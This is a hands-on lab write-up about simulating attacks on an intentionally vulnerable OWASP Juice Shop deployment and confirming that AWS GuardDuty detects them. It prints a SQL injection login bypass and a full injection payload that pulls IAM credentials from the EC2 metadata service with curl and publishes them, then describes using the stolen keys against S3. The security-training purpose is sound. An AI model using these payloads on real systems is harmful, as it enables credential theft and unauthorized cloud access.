<img src="https://cdn.prod.website-files.com/677c400686e724409a5a7409/6790ad949cf622dc8dcd9fe4_nextwork-logo-leather.svg" alt="NextWork" width="300" />

# Threat Detection with GuardDuty

**Project Link:** [View Project](http://learn.nextwork.org/projects/aws-security-guardduty)

**Author:** Abegail Manalac  
**Email:** abby.manalac@gmail.com

---

![Image](http://learn.nextwork.org/excited_gray_zealous_miracle_fruit/uploads/aws-security-guardduty_v1w2x3y4)

---

## Introducing Today's Project!

### Tools and concepts

The services I used were Amazon GuardDuty, S3, and Malware Protection. Key concepts I learnt include detecting unauthorized access, anomaly detection, findings analysis, and testing malware protection using the EICAR test file.

### Project reflection

This project took me approximately 2 hours. The most challenging part was acting as the hacker (simulating realistic attacker behavior while staying safe/controlled). It was most rewarding to see GuardDuty flag the exfiltration and the EICAR upload, confirming detections worked.

I did this to practice hands-on threat detection and incident analysis in AWS. Yes- it met my goals: I simulated attacks safely, validated GuardDuty findings, and tested malware protection, improving my detection and response skills.

---

## Project Setup

To set up for this project, I deployed a CloudFormation template that launches an intentionally vulnerable OWASP Juice Shop web app in an isolated AWS environment. The three main components are the web app infrastructure (EC2, VPC, CloudFront), an S3 bucket with sample sensitive data, and GuardDuty with logging for threat detection.

The web app deployed is called OWASP Juice Shop. To practice my GuardDuty skills, I will simulate attacks against it, observe how GuardDuty detects suspicious activity, and analyze the findings to strengthen detection and response.

GuardDuty is an AWS threat detection service that uses machine learning and threat intelligence to identify suspicious activity in your environment. In this project, it will monitor the vulnerable web app, detect attacks, and generate findings for investigation.

![Image](http://learn.nextwork.org/excited_gray_zealous_miracle_fruit/uploads/aws-security-guardduty_n1o2p3q4)

---

## SQL Injection

The first attack I performed on the web app is SQL injection, which means injecting malicious SQL into input fields so the app runs unintended database commands. SQL injection is a security risk because it can bypass authentication, expose or alter sensitive data, and compromise the database.

My SQL injection attack involved entering input like " ' or 1=1;-- " to manipulate the web app’s SQL query. This means the query always evaluates as true, letting me bypass the authentication check in a safe, controlled lab environment to demonstrate the vulnerability.


![Image](http://learn.nextwork.org/excited_gray_zealous_miracle_fruit/uploads/aws-security-guardduty_h1i2j3k4)

---

## Command Injection

Next, I used command injection, which is " #{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
" . The Juice Shop web app is vulnerable to this because it doesn’t sanitize input, allowing me to run JavaScript in the username field that accesses the EC2 instance metadata service and exposes IAM credentials in a public file.


To run command injection, I entered a malicious JavaScript script into the username field of the admin profile. The script will execute on the server, access the EC2 instance metadata service to retrieve IAM credentials, and save them in a public JSON file. The username shows " [object Object] " because the server created a new JavaScript object representing the credentials.json file.

![Image](http://learn.nextwork.org/excited_gray_zealous_miracle_fruit/uploads/aws-security-guardduty_t3u4v5w6)

---

## Attack Verification

To verify the attack's success, I navigated to " https://d2hsk0vd3pfipa.cloudfront.net/assets/public/credentials.json" on the deployed app. The credentials page showed me a JSON containing AccessKeyId, SecretAccessKey, Token, Expiration and related fields- confirming the IAM credentials were exfiltrated and publicly accessible.


![Image](http://learn.nextwork.org/excited_gray_zealous_miracle_fruit/uploads/aws-security-guardduty_x7y8z9a0)

---

## Using CloudShell for Advanced Attacks

The attack continues in CloudShell, because CloudShell provides a terminal where I can load the stolen IAM keys into the AWS CLI to access the target S3 bucket, producing API calls and CloudTrail activity that GuardDuty will log for detection and investigation.

In CloudShell, I used wget to download the public credentials.json from the JuiceShop URL into the shell so I had a local copy. Next, I ran a command using cat and jq to show and format the JSON, making it easier to read and revealing the AccessKeyId, SecretAccessKey, Token, and Expiration to use with the AWS CLI.

I then set up a profile, called stolen, to load the exfiltrated IAM keys into the AWS CLI so I could run S3 commands as the “hacker.” I had to create a new profile because it isolates the stolen credentials from my default session and accurately simulates attacker activity for GuardDuty and CloudTrail to detect.

![Image](http://learn.nextwork.org/excited_gray_zealous_miracle_fruit/uploads/aws-security-guardduty_j9k0l1m2)

---

## GuardDuty's Findings

After performing the attack, GuardDuty reported a finding within about 15 minutes. A finding is a notification of suspicious activity in your AWS environment, explaining what happened, who did it, and how, helping you investigate and respond.

GuardDuty's finding was called "UnauthorizedAccess\:IAMUser/InstanceCredentialExfiltration.InsideAWS", which means EC2 instance credentials were stolen and misused by another AWS account. Anomaly detection was used because GuardDuty spotted unusual activity compared to normal credential use.

GuardDuty's detailed finding reported that the attacker used an IAM role to access the Juice Shop’s S3 bucket, retrieved the secret text file, and did so from a location in my AWS Region via CloudShell. This insight helps trace the attack, assess impact, and plan prevention.

![Image](http://learn.nextwork.org/excited_gray_zealous_miracle_fruit/uploads/aws-security-guardduty_v1w2x3y4)

---

## Extra: Malware Protection

For my project extension, I enabled Malware Protection for S3 in GuardDuty, which scans objects in my bucket for malicious files. Malware is harmful software that can steal data, damage systems, or disrupt operations, and enabling this helps protect my AWS resources.

To test Malware Protection, I uploaded an EICAR test file into my S3 bucket. The uploaded file won't actually cause damage because it’s a harmless file designed only to trigger antivirus or security tools, letting me safely confirm that GuardDuty can detect malware.

Once I uploaded the file, GuardDuty instantly triggered a malware detection finding for the EICAR test file. This verified that Malware Protection was active and capable of identifying threats in my S3 bucket, proving the feature works as intended.

![Image](http://learn.nextwork.org/excited_gray_zealous_miracle_fruit/uploads/aws-security-guardduty_sm42x3y4)

---
